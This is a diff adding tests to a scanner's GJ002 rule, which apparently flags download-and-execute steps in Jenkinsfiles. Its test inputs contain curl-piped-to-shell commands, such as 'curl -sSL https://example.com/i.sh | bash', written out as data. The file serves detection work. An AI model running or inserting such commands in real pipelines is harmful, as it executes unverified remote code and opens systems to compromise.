@@ -72,6 +72,26 @@ class TestGJ002DownloadExecute:
         issues = analyzer.analyze("Jenkinsfile", content)
         assert not any(i.rule_id == "GJ002" for i in issues)
 
+    def test_one_finding_per_line(self, analyzer):
+        """Overlapping GJ002 patterns report one finding per line (#155)."""
+        content = (
+            "pipeline {\n  agent any\n  stages {\n    stage('i') {\n"
+            "      steps { sh 'curl -sSL https://example.com/i.sh | bash' }\n"
+            "    }\n  }\n}\n"
+        )
+        issues = analyzer.analyze("Jenkinsfile", content)
+        gj002 = [i for i in issues if i.rule_id == "GJ002"]
+        assert len(gj002) == 1
+        assert gj002[0].line == 5
+        assert gj002[0].confidence == 0.97
+        assert gj002[0].message == "Downloading and piping to shell in pipeline is RCE risk."
+
+    def test_bare_curl_pipe_still_detected_once(self, analyzer):
+        """Pattern 2 alone (no sh step) still yields one GJ002."""
+        content = "def x = 'curl -fsSL https://example.com | sh'\n"
+        issues = analyzer.analyze("Jenkinsfile", content)
+        assert len([i for i in issues if i.rule_id == "GJ002"]) == 1
+
 
 class TestGJ003CredentialExposure:
     """Tests for GJ003: Credential exposure to logs."""
